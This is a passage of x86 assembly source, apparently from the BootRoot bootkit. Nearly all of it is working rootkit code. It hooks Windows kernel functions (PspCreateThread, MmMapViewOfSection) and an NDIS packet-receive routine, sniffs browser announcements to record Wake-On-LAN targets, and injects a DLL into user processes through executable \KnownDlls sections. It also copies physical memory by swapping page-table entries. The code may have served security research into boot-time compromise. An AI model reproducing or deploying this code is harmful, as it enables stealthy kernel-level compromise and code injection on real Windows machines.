	jz		short @PspCreateThread_Hook_wolsectionfailed

	push		ebp					; var to receive Section object pointer
	mov		ecx, esp

	push		ebp			; ObReferenceObjectByHandle: HandleInformation
	push		ecx			; ObReferenceObjectByHandle: Object
	push		ebp			; ObReferenceObjectByHandle: AccessMode = KPROCESSOR_MODE::KernelMode
	push		ebp			; ObReferenceObjectByHandle: ObjectType
	push		ebp			; ObReferenceObjectByHandle: DesiredAccess
	push		eax			; ObReferenceObjectByHandle: Handle
	call		dword ptr [esi+ObReferenceObjectByHandle]
	pop		edi					; retrieve pointer to Section object from stack
	inc		eax
	jle		short @PspCreateThread_Hook_wolsectionfailed

	push		ebp					; var to receive pointer to mapped view
	mov		ecx, esp
	push		ebx					; var to contain view size (4KB)

	push		esp			; MmMapViewInSystemSpace: ViewSize
	push		ecx			; MmMapViewInSystemSpace: MappedBase
	push		edi			; MmMapViewInSystemSpace: Section
	call		dword ptr [esi+MmMapViewInSystemSpace]
	inc		eax
	pop		eax					; remove view size from stack
	pop		edi					; retrieve pointer to start of mapped view
	jle		short @PspCreateThread_Hook_wolsectionfailed

	push		ebp			; IoAllocateMdl: Irp
	push		ebp			; IoAllocateMdl: ChargeQuota
	push		ebp			; IoAllocateMdl: SecondaryBuffer
	push		ebx			; IoAllocateMdl: Length
	push		edi			; IoAllocateMdl: VirtualAddress
	call		dword ptr [esi+IoAllocateMdl]
	test		eax, eax
	jz		short @PspCreateThread_Hook_wolsectionfailed

	push		eax					; arg for IoFreeMdl below

	push		1			; MmProbeAndLockPages: Operation = LOCK_OPERATION::IoWriteAccess
	push		ebp			; MmProbeAndLockPages: AccessMode = KPROCESSOR_MODE::KernelMode
	push		eax			; MmProbeAndLockPages: MemoryDescriptorList
	call		dword ptr [esi+MmProbeAndLockPages]

						; IoFreeMdl: MemoryDescriptorList (pushed above)
	call		dword ptr [esi+IoFreeMdl]

	mov		[esi+G_WOLLIST], edi

@PspCreateThread_Hook_wolsectionfailed:

	pop		ebp

	jmp		@PspCreateThread_Hook_done_deref

PspCreateThread_Hook endp


MmMapViewOfSection_Hook proc

	; Stack frame:  (from http://cvs.sourceforge.net/viewcvs.py/mingw/w32api/include/ddk/ntifs.h?rev=1.4)
	;
	; [ESP+2Ch] = IN ULONG			Protect
	; [ESP+28h] = IN ULONG			AllocationType
	; [ESP+24h] = IN SECTION_INHERIT	InheritDisposition
	; [ESP+20h] = IN OUT PULONG		ViewSize
	; [ESP+1Ch] = IN OUT PLARGE_INTEGER	SectionOffset OPTIONAL
	; [ESP+18h] = IN ULONG			CommitSize
	; [ESP+14h] = IN ULONG			ZeroBits
	; [ESP+10h] = IN OUT PVOID		*BaseAddress
	; [ESP+0Ch] = IN PEPROCESS		Process
	; [ESP+08h] = IN PVOID			SectionObject
	; [ESP+04h] = return address to MmMapViewOfSection caller
	; [ESP]     = return address to displaced code in hook stub

	pushfd
	pushad

	call		GetEffectiveBase

	;
	; Check for section object created for this process
	;

	xor		ebp, ebp

	push		ebp					; variable to receive section handle, if it exists
	mov		edx, esp

	xor		eax, eax ;;;***###***;;; to-do: use process object pointer as identifier instead
	call		BuildSectionName
	mov		ecx, esp

	push		ebp					; OBJECT_ATTRIBUTES.SecurityQualityOfService
	push		ebp					; OBJECT_ATTRIBUTES.SecurityDescriptor
	push		040h					; OBJECT_ATTRIBUTES.Attributes = OBJ_CASE_INSENSITIVE;OBJ_KERNEL_HANDLE
	push		ecx					; OBJECT_ATTRIBUTES.ObjectName
	push		ebp					; OBJECT_ATTRIBUTES.RootDirectory
	push		18h					; OBJECT_ATTRIBUTES.Length
	mov		ecx, esp

	push		ecx			; ZwOpenSection: ObjectAttributes
	push		ebp			; ZwOpenSection: DesiredAccess
	push		edx			; ZwOpenSection: SectionHandle
	call		dword ptr [esi+ZwOpenSection]
	add		esp, 18h+38h				; remove OBJECT_ATTRIBUTES, UNICODE_STRING, and string from stack
	pop		edi					; retrieve section handle from stack if call succeeded
	inc		eax
	jle		short @MmMapViewOfSection_Hook_done

	;
	; Compare opened section object pointer to section being mapped
	;

	push		ebp					; variable to receive section object pointer
	mov		ecx, esp

	push		ebp			; ObReferenceObjectByHandle: HandleInformation
	push		ecx			; ObReferenceObjectByHandle: Object
	push		ebp			; ObReferenceObjectByHandle: AccessMode = KPROCESSOR_MODE::KernelMode
	push		ebp			; ObReferenceObjectByHandle: ObjectType (handle is trustworthy)
	push		ebp			; ObReferenceObjectByHandle: DesiredAccess
	push		edi			; ObReferenceObjectByHandle: Handle
	call		dword ptr [esi+ObReferenceObjectByHandle]
	pop		ebx					; retrieve pointer to section object
	inc		eax
	jle		short @MmMapViewOfSection_Hook_done_close

	cmp		ebx, [esp+24h+08h]			; does SectionObject argument point to opened section?
	je		short @MmMapViewOfSection_Hook_match

	push		ebx			; ObDereferenceObject: Object
	call		dword ptr [esi+ObDereferenceObject]

@MmMapViewOfSection_Hook_done_close:

	push		edi			; ZwClose: ObjectHandle
	call		dword ptr [esi+ZwClose]

@MmMapViewOfSection_Hook_done:

	popad
	popfd
	ret


@MmMapViewOfSection_Hook_match:

	push		ebx			; ObDereferenceObject: Object
	call		dword ptr [esi+ObDereferenceObject]

	push		edi			; ZwClose: ObjectHandle
	call		dword ptr [esi+ZwClose]

	popad
	popfd

	;
	; Invoke original MmMapViewOfSection and alter return value
	;

	pop		eax					; retrieve hook function return address, which points to
								;   displaced MmMapViewOfSection entry point code in hook stub
	push		9
	pop		ecx

	push		40h			; MmMapViewOfSection: Protect = PAGE_EXECUTE_READWRITE (LdrLoadDll uses
						;   PAGE_READWRITE, but we of course need execute permissions as well)
@MmMapViewOfSection_Hook_argloop:

	push		dword ptr [esp+28h]			; duplicate first nine arguments
	loop		@MmMapViewOfSection_Hook_argloop

	call		@MmMapViewOfSection_Hook_overexithook	; create new return address for MmMapViewOfSection

;--- start of MmMapViewOfSection exit hook code

	test		eax, eax
	jnz		short @MmMapViewOfSection_Hook_exithook_notsuccess

	mov		eax, 40000003h				; return STATUS_IMAGE_NOT_AT_BASE to force relocations

@MmMapViewOfSection_Hook_exithook_notsuccess:

	ret 28h							; return to original MmMapViewOfSection caller

;--- end of exit hook code

@MmMapViewOfSection_Hook_overexithook:

	jmp		eax					; transfer execution to real entry point of MmMapViewOfSection

MmMapViewOfSection_Hook endp


;###########################
;##  NDIS function hooks  ##
;###########################

ethFilterDprIndicateReceivePacket_Hook proc

	; Stack frame:
	;
	; [ESP+14h] = PTR     pointer to some structure {+00h: PNDIS_PACKET, ...}
	; [ESP+10h] = PTR     pointer to ???
	; [ESP+0Ch] = return address to ethFilterDprIndicateReceivePacket caller
	; [ESP+08h] = return CS from ethFilterDprIndicateReceivePacket hook
	; [ESP+04h] = return EIP into ethFilterDprIndicateReceivePacket after displaced prolog code
	; [ESP]     = return address to displaced code in hook stub

	pushfd
	pushad

	;
	; Get packet data pointer and size
	;

	stc							; set CF so JECXZs can short-jump to a JC to exit the function
	mov		ecx, [esp+24h+14h]			; arg_4: ptr to some structure
	jecxz		@ethFilterDprIndicateReceivePacket_Hook_done_c_1
	mov		ecx, [ecx]				; ptr to an NDIS_PACKET
	jecxz		@ethFilterDprIndicateReceivePacket_Hook_done_c_1
	mov		ecx, [ecx+8]				; ptr to an NDIS_BUFFER (MDL) for frame
	jecxz		@ethFilterDprIndicateReceivePacket_Hook_done_c_1
	mov		esi, [ecx+0Ch]				; MDL.MappedSystemVa: pointer to Ethernet frame data
	mov		ecx, [ecx+14h]				; MDL.ByteCount: length of Ethernet frame
	test		esi, esi
	stc							; (JZ is unaffected by CF)
	jz		short @ethFilterDprIndicateReceivePacket_Hook_done_c_1

	lea		edi, [esi+06h]				; save pointer to Ethernet.Source in EDI

	;
	; Verify that packet is IPv4 UDP/138
	;

	cmp		ecx, 18h
	jb		short @ethFilterDprIndicateReceivePacket_Hook_done_c_1

	add		esi, 0Ch
	lodsw							; Ethernet.Type = IP (0800h)
	cmp		ax, 0008h
	jne		short @ethFilterDprIndicateReceivePacket_Hook_done_ne_1
	mov		al, [esi]				; IP.Version = IPv4 / IP.HeaderLength >= 20
	cmp		al, 45h	
	jb		short @ethFilterDprIndicateReceivePacket_Hook_done_c_1
	cmp		al, 4Fh
	ja		short @ethFilterDprIndicateReceivePacket_Hook_done_a_1

	and		eax, 0Fh
	imul		edx, eax, 4				; EDX = size of IP header

	xor		eax, eax
	sub		ecx, 0Eh
	mov		ah, [esi+02h]				; IP.TotalLength <= Ethernet frame size - 0Eh
	mov		al, [esi+03h]
	cmp		eax, ecx
	ja		short @ethFilterDprIndicateReceivePacket_Hook_done_a_1
	sub		eax, edx
	jb		short @ethFilterDprIndicateReceivePacket_Hook_done_c_1
	xchg		ecx, eax

	test		word ptr [esi+06h], 0FF3Fh		; IP.Flags.MoreFrags / IP.FragmentOffset
	jnz		short @ethFilterDprIndicateReceivePacket_Hook_done_ne_1

	cmp		byte ptr [esi+09h], 11h			; IP.Protocol = UDP (17)
	jne		short @ethFilterDprIndicateReceivePacket_Hook_done_ne_1

	add		esi, edx				; advance ESI past IP header to start of UDP header

	cmp		ecx, 08h
@ethFilterDprIndicateReceivePacket_Hook_done_c_1:
	jb		short @ethFilterDprIndicateReceivePacket_Hook_done_ne_1 ; (ZF will be clear if below)

	lodsd							; UDP.SourcePort = UDP.DestinationPort = 138
	cmp		eax, 8A008A00h
	jne		short @ethFilterDprIndicateReceivePacket_Hook_done_ne_1

	xor		eax, eax
	lodsb							; UDP.Length <= IP.TotalLength - IP.HeaderLength
	mov		ah, al
	lodsb

	cmp		eax, ecx
@ethFilterDprIndicateReceivePacket_Hook_done_a_1:
	ja		short @ethFilterDprIndicateReceivePacket_Hook_done_ne_1 ; (ZF will be clear if above)
	cmp		ax, 0D0h
	jb		short @ethFilterDprIndicateReceivePacket_Hook_done_ne_1 ; (ZF will be clear if below)

	;
	; See if datagram is a Browser announcement
	;

	add		esi, 99h				; advance to "\MAILSLOT\BROWSE",0 string in Browser datagram
	cdq
	push		17
	pop		ecx

@ethFilterDprIndicateReceivePacket_Hook_mailslotloop:

	lodsb
	and		al, NOT 20h				; make sure letters are capitalized (note: converts '|' to '\')
	ror		dl, 1
	xor		dl, al
	loop		@ethFilterDprIndicateReceivePacket_Hook_mailslotloop

	cmp		dl, 8Ch					; hash of "\MAILSLOT\BROWSE",0
	jne		short @ethFilterDprIndicateReceivePacket_Hook_done_ne_1

	cmp		byte ptr [esi], 01h			; Browser.Command = host announcement
	je		short @ethFilterDprIndicateReceivePacket_Hook_commandokay
	cmp		byte ptr [esi], 0Fh			; Browser.Command = local master announcement
@ethFilterDprIndicateReceivePacket_Hook_done_ne_1:		;   (a local master browser will issue this instead of a host
	jne		short @ethFilterDprIndicateReceivePacket_Hook_done ;  announcement; the forms of both are the same)

@ethFilterDprIndicateReceivePacket_Hook_commandokay:

	mov		al, [esi+18h]				; Browser.ServerType (bit 16: Potential Browser is unreliable)
	and		al, 3					;   bit 1: Server
	sub		al, 3					;   bit 0: Workstation
	rcr		ecx, 1					; ECX bit 31 = 1 if host might be powering down
								;   (ECX was 0 from above loop)

		; Wake-On-LAN list entry format:
		;
		; +00h  WORD    Flags
		;                 bit  0 = 1: in use
		; +02h  [6]     MAC address
		; +08h  DWORD   IPv4 address
		; +0Ch  DWORD   timestamp (ticks since boot) at which entry was recorded

	;
	; See if this MAC address already has an active entry in list
	;

	call		GetEffectiveBase
	mov		esi, [esi+G_WOLLIST]
	test		esi, esi
	jz		short @ethFilterDprIndicateReceivePacket_Hook_done

	or		edx, -1					; indicate that no unused or oldest entry has been encountered

	push		esi					; preserve pointer to start of Wake-On-LAN targets list

	mov		eax, [edi+2]				; EAX = low 4 bytes of source MAC address

@ethFilterDprIndicateReceivePacket_Hook_macloop:

	test		byte ptr [esi], 01h
	jz		short @ethFilterDprIndicateReceivePacket_Hook_macloop_unused

	cmp		[esi+4], eax
	jne		short @ethFilterDprIndicateReceivePacket_Hook_macloop_nomatch

	mov		bx, [edi]
	cmp		[esi+2], bx
	jne		short @ethFilterDprIndicateReceivePacket_Hook_macloop_nomatch

	pop		eax					; discard saved ESI

	test		ecx, ecx				; host has already been recorded as powering down
	js		short @ethFilterDprIndicateReceivePacket_Hook_macloop_done
	dec		byte ptr [esi]				; clear flags bit 0 to delete entry
	jmp		short @ethFilterDprIndicateReceivePacket_Hook_macloop_done

  @ethFilterDprIndicateReceivePacket_Hook_macloop_unused:

	xor		ebx, ebx				; EBX = 0 to give unused entry preference over oldest in-use one
	jmp		short @ethFilterDprIndicateReceivePacket_Hook_macloop_checkoldest

  @ethFilterDprIndicateReceivePacket_Hook_macloop_nomatch:

	mov		ebx, [esi+0Ch]				; this entry's timestamp

  @ethFilterDprIndicateReceivePacket_Hook_macloop_checkoldest:

	cmp		ebx, edx
	jae		short @ethFilterDprIndicateReceivePacket_Hook_macloop_next

	mov		ch, cl					; mark this entry for replacement
	mov		edx, ebx

  @ethFilterDprIndicateReceivePacket_Hook_macloop_next:

	add		esi, 10h
	inc		cl
	jnz		short @ethFilterDprIndicateReceivePacket_Hook_macloop

	;
	; Record MAC address in an unused entry, or overwrite the oldest entry
	;

	mov		esi, edi				; ESI = pointer to source MAC address
	pop		edi					; EDI = pointer to start of WOL list

	test		ecx, ecx				; don't record an entry if this host isn't going down
	jns		short @ethFilterDprIndicateReceivePacket_Hook_macloop_done

	movzx		eax, ch					; EAX = index of entry to replace
	shl		eax, 1
	lea		edi, [edi+eax*8]			; now EDI points to start of entry to overwrite

	xor		eax, eax
	inc		eax
	stosw							; +00h  WORD    Flags: bit 0 = 1 (in-use)

	push		6
	pop		ecx
	rep movsb						; +02h  [6]     MAC address

	add		esi, 02h+0Ch				; now ESI points to source IP address
	movsd							; +08h  DWORD   IPv4 address

	mov		eax, ds:[0FFDF0000h]			; SharedUserData.TickCountLow (ticks since boot)
	test		eax, eax
	jne		short @ethFilterDprIndicateReceivePacket_Hook_gotticks
	mov		eax, ds:[0FFDF0320h]			; Windows 2003 has a new 64-bit tick count field, and
@ethFilterDprIndicateReceivePacket_Hook_gotticks:		;   leaves the original field at offset +00h zeroed out
	stosd							; +0Ch  DWORD   timestamp

@ethFilterDprIndicateReceivePacket_Hook_macloop_done:

	;
	; Clean up and prepare for return to NDIS.SYS
	;

@ethFilterDprIndicateReceivePacket_Hook_done:

	mov		eax, [esp+24h+4]			; return EIP from ethFDIRP hook
	mov		dword ptr ds:[00000000h], eax		; offset operand of "JMP FAR abs" within hook stub to return
ETHFDIRP_RETOFS EQU $-4						;   into original ethFDIRP code after displaced prolog

	popad
	popfd
	ret 08h							; discard CS:EIP from ethFDIRP "CALL FAR abs" hook

ethFilterDprIndicateReceivePacket_Hook endp


;####################################
;##  User-mode DLL injection code  ##
;####################################

@DLLInject:

	pushad

	mov		ebp, ebx				; now EBP = section handle to close after loading DLL
	xor		eax, eax

	;
	; Find NTDLL image base
	;

	mov		edx, fs:[eax+30h]			; pointer to PEB
	mov		edx, [edx+0Ch]				; pointer to PROCESS_MODULE_INFO
	mov		edx, [edx+1Ch]				; PROCESS_MODULE_INFO.ModuleListInitOrder.Flink

@DLLInject_modloop:

	mov		ebx, [edx-10h+18h]			; LDR_MODULE.BaseAddress
	mov		esi, [edx-10h+30h]			; LDR_MODULE.BaseDllName.Buffer
	cmp		byte ptr [edx-10h+2Ch], 9*2		; LDR_MODULE.BaseDllName.Length == size in bytes of L"ntdll.dll"
	mov		edx, [edx]				; LDR_MODULE.InInitializationOrderModuleList.Flink
	jne		short @DLLInject_modloop

	push		5
	pop		ecx

@DLLInject_modloop_nameloop:

	lodsb
	inc		esi
	and		al, NOT 20h				; make sure letters are capitalized (no letters or punctuation)
	ror		ah, 1
	xor		ah, al
	loop		@DLLInject_modloop_nameloop

	cmp		ah, 15h					; hash of "NTDLL"
	jne		short @DLLInject_modloop

	xor		eax, eax

	;
	; Import APIs from NTDLL
	;

	call		@DLLInject_overhashes

@DLLInject_hashes:

	db  9Bh			;  (LdrInitializeThunk)
	db  9Eh			; LdrLoadDll
	db  12h			; NtClose

@DLLInject_overhashes:
								; EBX = module image base
	pop		esi					; ESI = pointer to list of hashes
	db 6Ah, (@DLLInject_overhashes - @DLLInject_hashes)	; 6Ah/xx: PUSH simm8 (to keep MASM from being stupid)
	pop		ecx					; ECX = number of imports

	db 83h, 0ECh, ((@DLLInject_overhashes - @DLLInject_hashes) * 4) ; 83h/ECh/xx: SUB ESP, simm8 (i h8 masm)
	mov		edi, esp				; EDI = pointer to array of function pointers to look up

 ; (LdrInitializeThunk)
DLLINJECT_LDRLOADDLL		EQU (  1 *4)
DLLINJECT_ZWCLOSE		EQU (  2 *4)

	call		@DllInject_LookupImports
	jc		short @DLLInject_done_pop

	;
	; Load our DLL
	;

	call		@DLLInject_overdll			; UNICODE_STRING.Buffer
	dw		'0','0','0','0','0','0','0','0','.','d','l','l',0 ;;;***###***;;; to-do: do this better
@DLLInject_overdll:
	push		001A0018h				; UNICODE_STRING.{Length,MaximumLength}
	mov		ecx, esp

	push		eax					; var to receive loaded module handle

	push		esp			; LdrLoadDll: ModuleHandle
	push		ecx			; LdrLoadDll: ModuleFileName
	push		eax			; LdrLoadDll: Flags
	push		eax			; LdrLoadDll: PathToFile
	call		dword ptr [edi+DLLINJECT_LDRLOADDLL]
	pop		ecx					; retrieve module handle and remove variable from stack
	pop		ecx
	pop		ecx					; remove UNICODE_STRING variable from stack

	;
	; Clean up and resume execution of EXE entry point
	;

	push		ebp			; ZwClose: ObjectHandle
	call		dword ptr [edi+DLLINJECT_ZWCLOSE]

@DLLInject_done_pop:

	db 83h, 0C4h, ((@DLLInject_overhashes - @DLLInject_hashes) * 4) ; 83h/C4h/xx: ADD ESP, simm8 (MASM prefers to use imm32)
								; free stack space occupied by function pointer array
	popad

	xor		ebx, ebx
	mov		ebx, fs:[ebx+30h]			; EBX was PEB pointer before we overwrote it with section handle

	db 68h							; 68h/xxxxxxxx: PUSH imm
								;   (operand and subsequent RET will be generated above)
@DLLInject_end EQU $

@DLLInject_LookupImports EQU $+5

DLLINJECT_COPYSIZE EQU (@DLLInject_end - @DLLInject)
DLLINJECT_ALLOCSIZE EQU (DLLINJECT_COPYSIZE + 5 + LOOKUPIMPORTS_SIZE)


;#################################
;##  Auxiliary 32-bit routines  ##
;#################################

;;
;; LookupImports
;;
;; Parameters:	EBX = image base of module from which to import
;;		ECX = number of imports to look up
;;		ESI = pointer to list of 8-bit export name hashes to look up
;;		EDI = pointer to array of import pointers to fill in
;;
;; Returns:	CF clear if successful, or CF set on failure
;;
;; Notes:	LookupImports routine code must immediately follow @DLLInject code.
;;

LookupImports proc

	jecxz		@LookupImports_fail

	pushad

	;
	; Get export directory fields
	;

	mov		eax, [ebx+3Ch]				; IMAGE_DOS_DIRECTORY.e_lfanew
	mov		ebp, [ebx+eax+78h]			; IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	add		ebp, ebx				; EBP = pointer to export directory

	xor		edx, edx				; EDX = number of imports resolved
	or		ecx, -1					; index into name array = -1 (will be incremented first in loop)

@LookupImports_nameloop:

	inc		ecx
	cmp		ecx, [ebp+18h]				; IMAGE_EXPORT_DIRECTORY.NumberOfNames
	jae		short @LookupImports_fail

	mov		esi, [ebp+20h]				; IMAGE_EXPORT_DIRECTORY.AddressOfNames
	add		esi, ebx

		; hash next export name and compare to current import desired

	mov		esi, [esi+ecx*4]
	test		esi, esi
	jz		short @LookupImports_nameloop		; skip export because it doesn't have a name
	add		esi, ebx				; pointer to start of export name string

	xor		eax, eax

  @LookupImports_nameloop_hashloop:

	lodsb
	ror		ah, 1
	xor		ah, al
	test		al, al
	jnz		short @LookupImports_nameloop_hashloop

	mov		esi, [esp+4]				; ESI = saved pointer to list of 8-bit hashes

	cmp		ah, [esi+edx]				; does export name's hash match target?
	jnz		short @LookupImports_nameloop

		; store absolute function pointer for export

	mov		esi, [ebp+24h]				; IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
	add		esi, ebx
	movzx		eax, word ptr [esi+ecx*2]		; get name ordinal, which is an index into functions array

	mov		esi, [ebp+1Ch]				; IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
	add		esi, ebx
	mov		eax, [esi+eax*4]			; exported function entry point RVA
	add		eax, ebx				; convert to absolute function pointer
	mov		[edi+edx*4], eax			; store in array pointed to by EDI

	inc		edx					; advance to next import, if any remain
	cmp		edx, [esp+18h]				; saved ECX is number of imports to look up
	jne		short @LookupImports_nameloop		; (CF clear if equal)

@LookupImports_done:

	popad
	ret

@LookupImports_fail:

	stc
	popad
	ret

LOOKUPIMPORTS_SIZE EQU ($ - LookupImports)

LookupImports endp


;;
;; GetEffectiveBase
;;
;; Parameters:	none
;;
;; Returns:	ESI = starting address of BootRoot code block currently hosting execution
;;

GetEffectiveBase proc

	call		@GetEffectiveBase_geteip
@GetEffectiveBase_geteip:
	pop		esi
	sub		esi, ((@GetEffectiveBase_geteip - @BRCODE32_START) + BRCODE16_SIZE)
	ret

GetEffectiveBase endp


;;
;; BuildSectionName
;;
;; Parameters:	EAX = identifier (process object address) to use as 8-digit hexadecimal DLL name
;;
;; Returns:	ESP+8 -> Unicode string of the form "\KnownDlls\XXXXXXXX.dll", 0
;;		ESP   -> UNICODE_STRING structure describing DLL section name string
;;		(EAX, ECX destroyed)
;;
;; Notes:	Add 38h to ESP to remove UNICODE_STRING structure and the string that follows it.
;;

BuildSectionName proc

	pop		ecx					; remove return address so we can adjust caller's stack

	;
	; Copy base string onto stack as Unicode
	;

BSN_STRINGSIZE_CHARS EQU (@BuildSectionName_overstring - @BuildSectionName_string)
BSN_STRINGSIZE_BYTES EQU (BSN_STRINGSIZE_CHARS * 2)
BSN_STRINGSIZE_DWORDS EQU (BSN_STRINGSIZE_BYTES + 3) / 4

	sub		esp, (BSN_STRINGSIZE_DWORDS * 4)
	pushad

	push		eax					; temporarily preserve identifier in EAX

	call		@BuildSectionName_overstring
@BuildSectionName_string:
	db		"\KnownDlls\00000000.dll", 0
@BuildSectionName_overstring:
	pop		esi					; ESI points to start of ASCII base string
	lea		edi, [esp+24h]				; EDI points to start of Unicode string space created on stack

	xor		eax, eax

	db		6Ah, BSN_STRINGSIZE_CHARS		; 6Ah/xx: PUSH simm8 (to keep MASM from being stupid)
	pop		ecx

@BuildSectionName_charloop:

	lodsb
	stosw
	loop		@BuildSectionName_charloop

	pop		eax

	;
	; Embed identifier in hexadecimal as DLL name
	;

	sub		edi, (BSN_STRINGSIZE_DWORDS * 4) - (11*2) ; back up to start of DLL name
	mov		cl, 8

@BuildSectionName_hexloop:

	rol		eax, 4
	push		eax
								; some old trick for converting 0..0Fh --> {'0'..'9','A'..'F'}:
	and		al, 0Fh
	cmp		al, 0Ah					; CF set if AL == {0..9}, CF clear if AL == {0Ah..0Fh}
	sbb		al, 69h					; AL: {0..9} --> {96h..9Fh}, {0Ah..0Fh} --> {A1h..A6h}; CF set
	das							; convert {96h..9Fh} --> {30h..39h}, {A1h..A6h} --> {41h..46h}
								;   (exploits BCD-like nature of values for '0'..'9', 'A'..'F')
	stosb
	pop		eax
	inc		edi					; skip second byte of wide character
	loop		@BuildSectionName_hexloop

	popad

	;
	; Create UNICODE_STRING structure
	;

	push		esp					; UNICODE_STRING.Buffer
	push		((BSN_STRINGSIZE_BYTES) * 10000h) + (BSN_STRINGSIZE_BYTES - 2) ; UNICODE_STRING.{Length,MaximumLength}

	jmp		ecx					; return to caller (we retrieved return address into ECX)

BuildSectionName endp


;;
;; CopyPhysicalMemory
;;
;; Parameters:	EBX = start of physical address range to copy (should have bits 11..0 clear)
;;		ECX = number of bytes of physical memory to copy
;;		ESI = pointer to BootRoot base (as returned by GetEffectiveBase)
;;		EDI = pointer to start of destination virtual memory
;;
;; Returns:	CF clear if successful, or CF set on error
;;

CopyPhysicalMemory proc

	pushad

	xor		ebp, ebp

	;
	; Lock pages of destination into memory
	;

		; create MDL covering mapped view of DLL

	push		ebp			; IoAllocateMdl: Irp
	push		ebp			; IoAllocateMdl: ChargeQuota
	push		ebp			; IoAllocateMdl: SecondaryBuffer
	push		ecx			; IoAllocateMdl: Length
	push		edi			; IoAllocateMdl: VirtualAddress
	call		dword ptr [esi+IoAllocateMdl]
	test		eax, eax
	jz		short @CopyPhysicalMemory_fail

	push		eax					; arg for IoFreeMdl below
	push		eax					; arg for MmUnlockPages below

		; lock pages into memory

	push		1			; MmProbeAndLockPages: Operation = LOCK_OPERATION::IoWriteAccess
	push		ebp			; MmProbeAndLockPages: AccessMode = KPROCESSOR_MODE::KernelMode
	push		eax			; MmProbeAndLockPages: MemoryDescriptorList
	call		dword ptr [esi+MmProbeAndLockPages]

	;
	; Copy physical memory to destination virtual memory, one page at a time
	;

	push		esi					; preserve ESI because we'll need it during cleanup
	pushfd
	cli							; we don't want to be interrupted while modifying page tables

	mov		eax, cr4
	test		al, 20h					; CR4.PAE (bit 5)

	xchg		ebx, eax				; EAX will be PTE for current source page of physical memory
	mov		edx, [esp+10h+18h]			; EDX = saved ECX = copy length

	mov		al, 03h					; PTE.RW (writable), PTE.P (present)
	mov		ebp, cr3				; EBP = CR3 page directory pointer, for easier TLB flushing below
								; (TO-DO: check effects of CR4.PGE (bit 7) / use of PTE.G (bit 7))

	mov		ebx, 0C0000000h + (7FFE0000h/1000h*4)	; EBX = C01FFF80h, address of PTE for 7FFE0xxxh
	jz		short @CopyPhysicalMemory_nopae
	mov		ebx, 0C0000000h + (7FFE0000h/1000h*8)	; EBX = C03FFF00h, address of PTE when PAE is enabled
@CopyPhysicalMemory_nopae:					; note that we don't attempt to support > 4GB physical memory

	xor		ecx, ecx
	mov		ch, 10h					; ECX = 1000h (4KB page size)

@CopyPhysicalMemory_copyloop:

	cmp		edx, ecx
	jae		short @CopyPhysicalMemory_copyloop_ge4kb
	mov		ecx, edx				; ECX = lesser of 1000h and remaining copy length
@CopyPhysicalMemory_copyloop_ge4kb:

	xchg		eax, [ebx]				; temporarily replace SharedUserData (7FFE0000h) PTE, since
	wbinvd							;   it will always be present, and flush cache (486 friendly)
	mov		cr3, ebp				; flush TLB since we just modified a page table

	mov		esi, 7FFE0000h				; pointer to start of SharedUserData page

	push		ecx					; preserve ECX for adjusting source and remaining length below
	rep movsb
	pop		ecx

	xchg		eax, [ebx]				; restore SharedUserData PTE

	add		eax, ecx				; advance to next physical page (ECX=1000h until final iteration)
	sub		edx, ecx				; reduce remaining copy length; we're done when it reaches zero
	jnz		short @CopyPhysicalMemory_copyloop

	wbinvd
	mov		cr3, ebp				; flush cache and TLB now that copy loop has finished

	popfd							; restore EFlags.IF
	pop		esi					; restore ESI as pointer to imports and globals

		; unlock pages and free MDL

						; MmUnlockPages: MemoryDescriptorList (pushed above)
	call		dword ptr [esi+MmUnlockPages]

						; IoFreeMdl: MemoryDescriptorList (pushed above)
	call		dword ptr [esi+IoFreeMdl]

	clc							; indicate success
	popad
	ret

@CopyPhysicalMemory_fail:

	stc
	popad
	ret

CopyPhysicalMemory endp


;;
;; CreateDLLSection
;;
;; Parameters:	EAX = identifier to use as 8-digit hexadecimal DLL file name
;;		ECX = section size
;;		ESI = pointer to BootRoot base (as returned by GetEffectiveBase)
;;
;; Returns:	EAX = section object handle if successful (ZF clear), or
;;		EAX = 0 on error (ZF set)
;;		(ECX, EDX destroyed)
;;

CreateDLLSection proc

	push		0					; LARGE_INTEGER.HighPart
	push		ecx					; LARGE_INTEGER.LowPart
	mov		edx, esp

	call		BuildSectionName
	mov		ecx, esp

	xor		eax, eax

	push		eax					; OBJECT_ATTRIBUTES.SecurityQualityOfService
	push		eax					; OBJECT_ATTRIBUTES.SecurityDescriptor
	push		040h					; OBJECT_ATTRIBUTES.Attributes = OBJ_CASE_INSENSITIVE;OBJ_KERNEL_HANDLE
	push		ecx					; OBJECT_ATTRIBUTES.ObjectName
	push		eax					; OBJECT_ATTRIBUTES.RootDirectory
	push		18h					; OBJECT_ATTRIBUTES.Length
	mov		ecx, esp

	push		eax					; variable to receive section handle

	push		eax			; ZwCreateSection: FileHandle
	push		08000000h		; ZwCreateSection: SectionAttributes = SEC_COMMIT
	push		40h			; ZwCreateSection: PageAttributes = PAGE_EXECUTE_READWRITE
	push		edx			; ZwCreateSection: MaximumSize
	push		ecx			; ZwCreateSection: ObjectAttributes
	push		001F000Fh		; ZwCreateSection: DesiredAccess = SYNCHRONIZE|STANDARD_RIGHTS_REQUIRED|SECTION_MAP_{EXECUTE,READ,WRITE}|SECTION_QUERY
	sub		ecx, 4
	push		ecx			; ZwCreateSection: SectionHandle
	call		dword ptr [esi+ZwCreateSection]
	pop		ecx					; ECX = section handle if ZwCreateSection succeeded
	add		esp, 18h+38h+08h

	shl		eax, 1					; CF set if EAX < 0
	cmc							; now CF set if EAX >= 0
	sbb		eax, eax				; EAX = -1 if ZwCreateSection succeeded, else 0
	and		eax, ecx				; now EAX = ECX if ZwCreateSection succeeded, else 0
	ret

CreateDLLSection endp


;;
;; DisassembleProlog
;;
;; Parameters:	ESI   = pointer to start of function whose entry point code is to be displaced
;;		[ESP] = minimum number of bytes to disassemble
;;
;; Returns:	CF clear and ECX = number of bytes to displace if successful, or CF set on failure
;;		[ESP] argument is not removed from stack
;;

DisassembleProlog proc

	pushad

	;
	; Disassemble function entry point code (loosely referred to as "prolog")
	;

	call		@DisassembleProlog_overlists

		; Lists of opcodes and prefixes we recognize.
		;
		; Note that we intentionally do not recognize JMP/Jcc, CALL, INT, RET, or HLT, and we don't
		; do 0Fh+xx opcodes or the 67h prefix.  Microsoft compilers only use a small subset of the
		; instruction set, so further corner-cutting optimizations are possible.

DISASM_NUM_PREFIXES EQU 10
